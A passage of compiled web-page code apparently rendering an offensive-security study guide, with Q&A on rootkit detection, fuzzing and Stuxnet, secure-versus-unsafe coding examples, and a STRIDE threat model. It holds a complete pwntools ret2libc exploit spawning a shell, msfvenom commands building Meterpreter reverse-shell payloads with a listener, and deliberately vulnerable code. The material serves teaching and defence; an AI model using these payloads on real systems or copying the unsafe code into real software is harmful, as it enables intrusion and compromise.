    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["The function you need has multiple arguments (x86_64 convention uses ", (0,jsx_runtime.jsx)(_components.code, {
          children: "rdi"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "rsi"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "rdx"
        }), ", etc.)"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "You need to call multiple functions"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "You need to bypass ASLR with complex logic"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["You need to set up a syscall (", (0,jsx_runtime.jsx)(_components.code, {
          children: "execve"
        }), " needs rax, rdi, rsi, rdx)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q18-how-would-you-detect-a-rootkit-on-a-linux-system",
      children: "Q18: How would you detect a rootkit on a Linux system?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Detection techniques in order of increasing reliability:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1. Userland checks (unreliable → rootkit hooks these)\nlsmod          # may be hooked to hide modules\nps aux         # may be hooked to hide processes\nnetstat -tlnp  # may be hooked to hide ports\n\n# 2. Cross-view detection (compare /proc with syscall results)\ncat /proc/modules     # vs lsmod → discrepancy indicates hooking\ncat /proc/net/tcp     # vs netstat → port hiding detection\n\n# 3. Known rootkit scanners\nchkrootkit\nrkhunter --check\n\n# 4. Memory forensics (most reliable)\n# Use LiME to acquire memory, Volatility to analyze\n# Volatility plugins: linux_check_syscall, linux_check_modules,\n# linux_check_fop, linux_check_creds, linux_check_afinfo\n\n# 5. Boot from trusted media\n# Reboot from a clean CD/USB, mount the disk, and examine\n# Compare file hashes against package manager database\ndpkg --verify       # Debian/Ubuntu\nrpm -Va             # RHEL/CentOS\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q19-what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing",
      children: "Q19: What is the difference between black-box, white-box, and grey-box fuzzing?"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Knowledge"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Coverage Info"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Speed"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Black-box"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (binary only)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Random mutation, Peach Fuzzer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "White-box"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full source + symbolic execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Path constraints"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Slow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SAGE, KLEE, angr"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Grey-box"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Binary instrumentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Partial (basic block coverage)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fast"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AFL, libFuzzer, Honggfuzz"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Grey-box"
      }), " is the most practical for real-world use. AFL uses lightweight compile-time instrumentation to track which edges (branch transitions) are exercised by each input. Coverage feedback guides mutation toward new paths."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q20-explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level",
      children: "Q20: Explain how the Stuxnet PLC rootkit worked at the code level."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Stuxnet replaced the legitimate ", (0,jsx_runtime.jsx)(_components.code, {
        children: "s7otbxdx.dll"
      }), " (Siemens Step 7 communication library) with a trojanized version. This DLL handled all communication between the engineering workstation and Siemens S7 PLCs."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Original flow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 7 → s7otbxdx.dll → MPI/Profibus → PLC → Frequency Converter → Centrifuge\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Stuxnet-modified flow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 7 → STUXNET s7otbxdx.dll → [interceptor] → PLC → [modified values] → Centrifuge\n\nInterception logic:\n1. READ from PLC: intercept the read call\n   - If reading centrifuge speed data, return recorded \"normal\" values (playback attack)\n   \n2. WRITE to PLC: intercept the write call\n   - If writing to centrifuge frequency converter, modify to dangerous frequencies\n   - Increase rotor speed beyond safe limits (cascade failure)\n   - Then rapidly decrease (mechanical stress)\n   \n3. After 27 minutes of sabotage, record normal values\n   - Wait 27 days before next sabotage cycle (stealth)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "PLC payload components:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "DP_RECV hook"
        }), " → intercepted Profibus communication at the PLC level"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "OB1 (Organization Block 1) modification"
        }), " → PLC main cycle modified"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "FC1865/FC1866"
        }), " → malicious function blocks injected into PLC"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Attack thresholds"
        }), " → specific to centrifuge rotor frequencies (1,064 Hz / 1,410 Hz)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This was the first known malware to cause physical destruction by manipulating industrial control processes."
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-secure-coding-examples",
      children: "Extended Secure Coding Examples"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cc-integer-overflow-leading-to-buffer-overflow",
      children: "C/C++: Integer Overflow Leading to Buffer Overflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n\nvoid vulnerable_copy(size_t user_len, const char *data) {\n    // Integer overflow vulnerability!\n    // If user_len = 0xFFFFFFFF and header = 16, user_len + 16 wraps to 15\n    size_t total = user_len + 16;  // vulnerable addition\n    char *buffer = malloc(total);\n    if (!buffer) return;\n\n    // memcpy(user_len) writes a massive amount\n    // because total is small but user_len is large\n    memcpy(buffer + 16, data, user_len);\n    free(buffer);\n}\n\nvoid safe_copy(size_t user_len, const char *data) {\n    const size_t HEADER_SIZE = 16;\n\n    // Check for overflow before doing arithmetic\n    if (user_len > SIZE_MAX - HEADER_SIZE) {\n        fprintf(stderr, \"Size overflow detected\\n\");\n        return;\n    }\n    size_t total = user_len + HEADER_SIZE;\n    char *buffer = malloc(total);\n    if (!buffer) return;\n\n    memcpy(buffer + HEADER_SIZE, data, user_len);\n    free(buffer);\n}\n\nint main() {\n    // Unsafe: this would wrap around\n    // safe_copy(0xFFFFFFFF, \"AAAA\");\n\n    printf(\"Integer overflow example compiled.\\n\");\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "java-xml-external-entity-xxe-prevention",
      children: "Java: XML External Entity (XXE) Prevention"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-java",
        children: "import javax.xml.parsers.*;\nimport org.w3c.dom.*;\nimport java.io.*;\n\npublic class SecureXMLParser {\n    public static Document parseXMLSafe(String xmlContent) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n\n        // XXE mitigations → OWASP recommended\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n        factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n        factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n        factory.setXIncludeAware(false);\n        factory.setExpandEntityReferences(false);\n\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        return builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));\n    }\n\n    // Unsafe parser → susceptible to XXE\n    public static Document parseXMLUnsafe(String xmlContent) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        // All features are default → XXE attacks work\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        return builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "java-path-traversal-prevention",
      children: "Java: Path Traversal Prevention"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-java",
        children: "import java.io.*;\nimport java.nio.file.*;\n\npublic class SecureFileAccess {\n    private static final String BASE_DIR = \"/var/app/data/\";\n\n    public static String readFileSafe(String filename) throws IOException {\n        // Canonicalize the requested path\n        Path requestedPath = Paths.get(BASE_DIR, filename).normalize();\n        Path canonicalPath = requestedPath.toRealPath();\n        Path basePath = Paths.get(BASE_DIR).toRealPath();\n\n        // Ensure the resolved path is within the base directory\n        if (!canonicalPath.startsWith(basePath)) {\n            throw new SecurityException(\"Path traversal detected: \" + filename);\n        }\n\n        return Files.readString(canonicalPath);\n    }\n\n    // UNSAFE version → vulnerable to ../../../etc/passwd\n    public static String readFileUnsafe(String filename) throws IOException {\n        return Files.readString(Paths.get(BASE_DIR + filename));\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "javascript-prototype-pollution-prevention",
      children: "JavaScript: Prototype Pollution Prevention"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "// UNSAFE → prototype pollution vulnerability\nfunction merge(target, source) {\n    for (let key in source) {\n        if (source.hasOwnProperty(key)) {\n            target[key] = source[key];  // can set __proto__ or constructor.prototype\n        }\n    }\n    return target;\n}\n\n// SAFE → filter out dangerous keys\nfunction safeMerge(target, source) {\n    const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];\n\n    for (let key in source) {\n        if (source.hasOwnProperty(key)) {\n            if (DANGEROUS_KEYS.includes(key)) {\n                throw new Error(`Forbidden key: ${key}`);\n            }\n            target[key] = source[key];\n        }\n    }\n    return target;\n}\n\n// SAFER → use Object.assign with null prototype\nfunction saferMerge(target, source) {\n    const clean = Object.create(null);  // no __proto__ at all\n    const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];\n\n    for (let key of Object.keys(source)) {\n        if (!DANGEROUS_KEYS.includes(key)) {\n            clean[key] = source[key];\n        }\n    }\n    return Object.assign(target, clean);\n}\n\n// Demonstration\nconst payload = JSON.parse('{\"__proto__\": {\"admin\": true}}');\nconst obj = {};\ntry {\n    safeMerge(obj, payload);\n    console.log(\"Protected:\", obj.admin);  // undefined\n} catch (e) {\n    console.log(\"Blocked:\", e.message);     // Forbidden key: __proto__\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "nodejs-preventing-command-injection",
      children: "Node.js: Preventing Command Injection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "const { exec, execFile, spawn } = require('child_process');\nconst path = require('path');\n\n// ❌ UNSAFE: User input directly in shell command\nfunction backupUser_raw(username) {\n    exec(`tar -czf /backups/${username}.tar.gz /home/${username}`,\n         (err, stdout, stderr) => {\n             if (err) console.error(err);\n         });\n}\n\n// ✅ SAFE: Whitelist valid usernames\nconst VALID_USERS = new Set(['alice', 'bob', 'charlie']);\n\nfunction backupUser_safe(username) {\n    if (!VALID_USERS.has(username)) {\n        throw new Error(`Invalid user: ${username}`);\n    }\n    execFile('tar', ['-czf', `/backups/${username}.tar.gz`, `/home/${username}`],\n             { shell: false },\n             (err, stdout, stderr) => {\n                 if (err) console.error(err);\n             });\n}\n\n// ✅ SAFER: Parameterized with spawn\nfunction backupUser_safer(username) {\n    if (!/^[a-zA-Z0-9_]+$/.test(username)) {\n        throw new Error('Invalid username format');\n    }\n    const child = spawn('tar', ['-czf', `/backups/${username}.tar.gz`, `/home/${username}`],\n                          { shell: false });\n    child.on('exit', (code) => {\n        console.log(`Backup exited with code ${code}`);\n    });\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-practical-rop-chain-walkthrough-with-pwntools",
      children: "Extended Practical: ROP Chain Walkthrough with pwntools"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "full-exploit-script-for-ret2libc-with-aslr-bypass",
      children: "Full Exploit Script for ret2libc with ASLR Bypass"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "#!/usr/bin/env python3\n# exploit.py → Full ROP exploitation for a 64-bit ASLR + NX binary\n# Target binary has: no PIE (fixed .text), but ASLR and NX enabled.\n# Vulnerability: format string for info leak + gets() for overflow.\nfrom pwn import *\n\n# Configuration\nelf = ELF('./vuln64')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\n# Addresses from binary (no PIE here but we use example values for reference)\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = elf.symbols['main']\npop_rdi = 0x4012b3  # pop rdi; ret → from binary\n\ndef exploit():\n    # ============ STAGE 1: Leak libc address via puts(puts@GOT) ============\n    payload1 = b\"A\" * 40           # padding to return address (64-bit)\n    payload1 += p64(pop_rdi)       # return to pop_rdi gadget\n    payload1 += p64(puts_got)      # rdi = puts@GOT (address to leak)\n    payload1 += p64(puts_plt)      # call puts (prints actual libc address)\n    payload1 += p64(main_addr)     # return to main for stage 2\n\n    # Send stage 1\n    p = process('./vuln64')\n    p.recvuntil(b\"> \")             # wait for prompt\n    p.sendline(payload1)\n    p.recvline()                   # skip newline\n\n    # Parse leaked address (6 bytes from puts@GOT)\n    leaked = u64(p.recv(6).ljust(8, b'\\x00'))\n    log.info(f\"Leaked puts@GOT: {hex(leaked)}\")\n\n    # Calculate libc base\n    libc.address = leaked - libc.symbols['puts']\n    log.info(f\"Libc base: {hex(libc.address)}\")\n\n    # ============ STAGE 2: ret2libc with system(\"/bin/sh\") ============\n    bin_sh = next(libc.search(b'/bin/sh'))\n    system_addr = libc.symbols['system']\n    ret_gadget = 0x40101a         # ret (for stack alignment)\n\n    payload2 = b\"A\" * 40\n    payload2 += p64(ret_gadget)    # stack alignment (movaps issue)\n    payload2 += p64(pop_rdi)\n    payload2 += p64(bin_sh)        # rdi = &\"/bin/sh\"\n    payload2 += p64(system_addr)   # call system(\"/bin/sh\")\n\n    p.recvuntil(b\"> \")\n    p.sendline(payload2)\n    p.interactive()\n\nif __name__ == \"__main__\":\n    exploit()\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "explanation-of-the-movaps-stack-alignment-issue",
      children: "Explanation of the movaps Stack Alignment Issue"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["On x86_64, the ", (0,jsx_runtime.jsx)(_components.code, {
        children: "movaps"
      }), " instruction (used in ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), "'s prologue) requires 16-byte stack alignment. If the stack is misaligned when ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), " is called, it crashes. Adding a single ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), " gadget before the target function pops one more 8-byte value, adjusting the stack by 8 and restoring 16-byte alignment."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-malware-analysis-ransomware-encryption-flow",
      children: "Extended Malware Analysis: Ransomware Encryption Flow"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "sequenceDiagram\n    participant Attacker\n    participant Ransomware\n    participant Victim\n    participant C2 Server\n\n    Attacker->>Ransomware: Deploy via phishing\n    Ransomware->>Victim: Generate AES-256 session key\n    Ransomware->>Victim: Scan drives for target extensions\n    Ransomware->>Victim: Encrypt each file with AES-256\n    Note over Ransomware,Victim: Files get .encrypted extension\n    Ransomware->>C2 Server: Send AES key (encrypted with RSA-4096 public key)\n    C2 Server-->>Ransomware: Store key (associated with victim ID)\n    Ransomware->>Victim: Delete shadow copies (vssadmin)\n    Ransomware->>Victim: Display ransom note (README.txt)\n    Victim->>C2 Server: Visit .onion payment site\n    C2 Server-->>Victim: Request BTC payment ($500–$10K)\n    Victim-->>C2 Server: Send BTC + victim ID\n    Attacker->>C2 Server: Confirm payment\n    C2 Server->>Victim: Return RSA-decrypted AES key\n    Victim->>Victim: Decrypt files with AES key\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-fuzzing-libfuzzer-example",
      children: "Extended Fuzzing: libFuzzer Example"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// fuzz_target.c → compile with clang -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c\n#include <stdint.h>\n#include <stddef.h>\n#include <string.h>\n#include <stdlib.h>\n\nint vulnerable_parse(const uint8_t *data, size_t size) {\n    if (size < 8) return -1;\n\n    // Potential integer overflow\n    uint32_t len = *(uint32_t *)data;\n    if (size < 8 + len) return -1;\n\n    // Potential buffer overflow\n    char buf[64];\n    if (len >= 64) return -1;\n\n    memcpy(buf, data + 8, len);  // If len is miscalculated, this overflows\n    buf[len] = '\\0';\n\n    // Potential format string vulnerability\n    if (buf[0] == '%') {\n        printf(buf);  // format string bug!\n    }\n\n    return 0;\n}\n\n// libFuzzer entry point\nint LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {\n    vulnerable_parse(Data, Size);\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Compile and run\nclang -fsanitize=fuzzer,address -g -o fuzz_target fuzz_target.c\n./fuzz_target -max_len=128 -timeout=5 -runs=1000000\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Sample output:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "INFO: Running with entropic power schedule (0xFF, 100).\nINFO: Seed: 12345678\nINFO:        1 files found in testcases/\nINFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes\nINFO: A corpus is not provided, starting from an empty corpus\n#2     INITED cov: 4 ft: 5 corp: 1/1b exec/s: 0 rss: 35Mb\n#7     NEW    cov: 6 ft: 7 corp: 2/10b exec/s: 0 rss: 36Mb\n#13    NEW    cov: 8 ft: 9 corp: 3/20b exec/s: 0 rss: 36Mb\n#42    NEW    cov: 10 ft: 12 corp: 4/32b exec/s: 0 rss: 37Mb\n#173   REDUCE cov: 10 ft: 12 corp: 4/28b exec/s: 0 rss: 37Mb\n#174   NEW    cov: 11 ft: 14 corp: 5/36b exec/s: 0 rss: 37Mb\n==12345== ERROR: AddressSanitizer: heap-buffer-overflow\n    #0 0x4f5a3a in memcpy\n    #1 0x4f58d0 in vulnerable_parse fuzz_target.c:21:5\n    #2 0x4f57c0 in LLVMFuzzerTestOneInput fuzz_target.c:33:5\nSUMMARY: AddressSanitizer: heap-buffer-overflow fuzz_target.c:21\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-exploit-development-shellcode-for-windows",
      children: "Extended Exploit Development: Shellcode for Windows"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "windows-x86-messagebox-shellcode",
      children: "Windows x86 MessageBox Shellcode"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-nasm",
        children: "; windows_msgbox.asm\n; nasm -f win32 windows_msgbox.asm -o windows_msgbox.obj\n; Display a MessageBox and exit\n\nBITS 32\n\nsection .text\nglobal _start\n\n_start:\n    ; Get kernel32 base address from PEB\n    xor eax, eax\n    mov eax, [fs:eax + 0x30]     ; PEB\n    mov eax, [eax + 0x0C]        ; LDR\n    mov eax, [eax + 0x14]        ; InMemoryOrderModuleList (first = kernel32)\n    mov eax, [eax]               ; second module\n    mov eax, [eax]               ; third module\n    mov eax, [eax + 0x10]        ; kernel32 base address\n\n    ; Find GetProcAddress in kernel32 export table\n    ; (simplified → full implementation walks PE export directory)\n    ; ...\n\n    ; Call MessageBoxA\n    push 0                       ; MB_OK\n    push 0x0073736573            ; \"sess\" + null\n    push 0x20676e69              ; \"ing \"\n    push 0x6c656e6e              ; \"nnel\"\n    push 0x61684320              ; \" Cha\"\n    push 0x65766168              ; \"have\"\n    push 0x20756f59              ; \"You \"\n    mov esi, esp\n    push 0\n    push esi\n    push esi\n    push 0\n    call MessageBoxA\n\n    ; ExitProcess(0)\n    push 0\n    call ExitProcess\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "msfvenom-for-windows-meterpreter-payload",
      children: "msfvenom for Windows: Meterpreter Payload"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Windows x64 staged meterpreter reverse HTTPS\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 \\\n         -b \"\\x00\\x0a\\x0d\" -f exe -o meterpreter_https.exe\n\n# Windows x86 VBS injection payload\nmsfvenom -p windows/vncinject/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \\\n         -b \"\\x00\" -f vba\n\n# PowerShell one-liner (fileless)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \\\n         -b \"\\x00\" -f psh-reflection\n\n# Start multi-handler in msfconsole\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 0.0.0.0\nmsf6 exploit(multi/handler) > set LPORT 4444\nmsf6 exploit(multi/handler) > exploit -j\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-ssdlc-threat-modeling-example-stride-for-web-application",
      children: "Extended SSDLC: Threat Modeling Example (STRIDE for Web Application)"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "e-commerce-application-threat-model",
      children: "E-commerce Application Threat Model"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            style: {
              textAlign: "right"
            },
            children: "STRIDE Category"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Threat"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Severity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            style: {
              textAlign: "right"
            },
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "S"
            }), "poofing"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker impersonates another user"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Strong authentication (MFA), session management with HttpOnly/Secure cookies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            style: {
              textAlign: "right"
            },
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "T"
            }), "ampering"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modify price field in POST request"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Critical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Server-side price validation, signed transaction data"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            style: {
              textAlign: "right"
            },
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "R"
            }), "epudiation"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User denies placing an order"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Audit logging of all transactions, digital signatures"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            style: {
              textAlign: "right"
            },
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "I"
            }), "nformation Disclosure"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Leak credit card numbers via SQLi"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Critical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Parameterized queries, encryption at rest (AES-256), tokenization"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            style: {
              textAlign: "right"
            },
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "D"
            }), "enial of Service"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Botnet floods checkout endpoint"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rate limiting, Web Application Firewall (WAF), CDN DDoS protection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            style: {
              textAlign: "right"
            },
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "E"
            }), "levation of Privilege"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer gains admin panel access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Critical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Role-based access control (RBAC), input validation on admin actions"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Risk scoring with DREAD:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
